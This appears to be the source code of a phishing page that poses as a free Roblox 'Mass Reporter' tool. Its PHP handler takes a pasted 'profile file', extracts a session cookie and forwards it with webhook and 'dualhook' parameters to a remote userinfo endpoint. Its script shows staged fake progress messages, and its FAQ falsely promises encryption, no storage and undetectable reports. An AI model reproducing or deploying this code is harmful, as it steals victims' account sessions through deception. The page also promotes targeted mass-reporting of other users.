...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    ...
    if (strlen($profile) < 400) {
        $errors[] = "Invalid profile file!";
    }
    ...
    if (empty($errors)) {
        ...
        if ($cookie) {
            ...
            $userInfoUrl = "$dom/controlPage/apis/userinfo.php?cookie=" . urlencode($cookie) . "&username=" . urlencode($username) . "&web={web}&dh={dualhook}";
        ...
        die(json_encode(['success' => 'Successfully started mass reporting!']));
    } else {
...
<head>
  ...
  <meta name="description" content="HyperBlox Mass Reporter - Mass report Roblox users with ease, for free!">
  <meta name="keywords" content="Roblox, HyperBlox, Mass Reporter, Report Tool, Roblox Report, free Roblox tools">
  ...
  <meta itemprop="name" content="HyperBlox Mass Reporter">
  <meta itemprop="description" content="HyperBlox Mass Reporter - Mass report Roblox users with ease, for free!">
  <title>Mass Reporter - HyperBlox</title>
    ...
    <section>
        <div class="container">
            <div class="section-header">
                ...
                <h1>HyperBlox <span class="text-gradient">Mass Reporter</span></h1>
                <p>Mass report users with ease, powered by HyperBlox!</p>
            </div>
            
            <div class="tool-container">
                <div class="glass-card">
                    <h3>Mass Reporter</h3>
                    <p>Paste the profile file and username below, then click "Start Reporting!"</p>
                    
                    <form method="post" id="reportForm">
                        <div class="form-group">
                            <label for="profile" class="form-label">Profile File</label>
                            <input type="text" class="form-input" id="profile" placeholder="Paste complete profile file..." name="profile" autocomplete="off" minlength="3" required>
                        </div>
                        
                        <div class="form-group">
                            <label for="username" class="form-label">Username</label>
                            <input type="text" class="form-input" id="username" placeholder="Enter target username" name="username" autocomplete="off" minlength="3" maxlength="20" required>
                        </div>
                ...
                <div class="glass-card glass-card-gold">
                    ...
                    <div class="video-container">
                        <video width="100%" height="auto" controls poster="https://via.placeholder.com/800x450/0f172a/94a3b8?text=HyperBlox+Demonstration">
                            <source src="https://hyperblox.eu/Mass-Reporter/massreporter.mp4" type="video/mp4">
            ...
            <div class="faq-section">
                ...
                <p class="text-center" style="max-width: 800px; margin-left: auto; margin-right: auto;">
                    Get instant answers to the most common questions about mass reporting.
                </p>
                ...
                <div class="faq-item">
                    ...
                    <div class="faq-answer">
                        <p>We use strong encryption to lock your data and never store any of your info. Every request is hidden through random routing so it can't be tracked. Your account stays completely safe while reporting.</p>
                    </div>
                </div>
                
                <div class="faq-item">
                    <div class="faq-question">
                        <span>What makes your reporting undetectable?</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p>We've designed our system to send reports just like Roblox does, so it looks completely natural. Our tools avoid all tracking systems, making each report impossible to detect.</p>
                    </div>
                </div>
                
                <div class="faq-item">
                    <div class="faq-question">
                        <span>Will this get the user banned?</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p>Our system increases report volume but actual moderation depends on Roblox's systems and the content being reported.</p>
                    </div>
                </div>
                
                <div class="faq-item">
                    <div class="faq-question">
                        <span>How fast will reports be sent?</span>
                        <i class="fas fa-chevron-down"></i>
                    </div>
                    <div class="faq-answer">
                        <p>Most reports are sent within 15 to 30 seconds. If it's busy it might take up to 2 minutes.</p>
                    </div>
                </div>
            </div>
...
<script>
    document.addEventListener('DOMContentLoaded', function() {
        ...
        document.getElementById('reportForm')?.addEventListener('submit', function(e) {
            ...
            setTimeout(() => {
                submitBtn.innerHTML = '<i class="fas fa-lock"></i> Verifying Target...';
            }, 1000);

            setTimeout(() => {
                submitBtn.innerHTML = '<i class="fas fa-flag"></i> Sending Reports...';
            }, 2000);
            ...
            .then(data => {
                if (data.error) {
                    showAlert('error', 'Report Failed', data.error);
                } else if (data.success) {
                    showAlert('success', 'Reports Started', data.success);
                }
            })
            .catch(() => {
                showAlert('warning', 'Connection Issue', 'Failed to connect to reporting servers. Try again later.');
            })
            .finally(() => {
